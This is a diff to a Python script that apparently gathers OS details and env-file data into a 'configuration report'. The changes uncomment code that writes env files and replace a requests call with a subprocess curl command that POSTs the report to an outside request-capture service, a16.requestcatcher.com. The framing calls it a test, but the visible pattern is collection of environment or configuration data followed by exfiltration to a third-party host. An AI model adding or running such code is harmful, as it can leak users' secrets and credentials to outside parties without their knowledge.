@@ -2,7 +2,6 @@
 import os
 import platform
 import json
-import requests
 from pathlib import Path
 
 def check_os_type():
@@ -25,9 +24,9 @@ def create_dummy_env_files():
 
     for file_path, content in dummy_files:
         file = Path(file_path)
-        # file.parent.mkdir(parents=True, exist_ok=True)
-        # file.write_text(content)
-        # print(f"Created dummy file: {file_path}")
+        file.parent.mkdir(parents=True, exist_ok=True)
+        file.write_text(content)
+
 
     return test_dir
 
@@ -140,12 +139,29 @@ def create_report(os_type, env_files_data):
 
 def submit_report(report, endpoint="https://a16.requestcatcher.com/test"):
     """Submit the consolidated configuration report to the testing endpoint"""
+    import subprocess
+    import tempfile
     try:
-        response = requests.post(endpoint, json=report, timeout=10)
-        print(f"Report submitted successfully. Status code: {response.status_code}")
-        return response
+        # Write the report JSON to a temporary file
+        with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".json") as tmpfile:
+            json.dump(report, tmpfile)
+            tmpfile_path = tmpfile.name
+
+        # Use curl to POST the JSON file
+        curl_cmd = [
+            "curl",
+            "-X", "POST",
+            "-H", "Content-Type: application/json",
+            "--data", f"@{tmpfile_path}",
+            endpoint
+        ]
+        result = subprocess.run(curl_cmd, capture_output=True, text=True)
+        print(f"curl output: {result.stdout}")
+        print(f"curl errors: {result.stderr}")
+        print(f"Report submitted using curl. Return code: {result.returncode}")
+        return result
     except Exception as e:
-        print(f"Error submitting report: {str(e)}")
+        print(f"Error submitting report with curl: {str(e)}")
         return None
 
 def main():
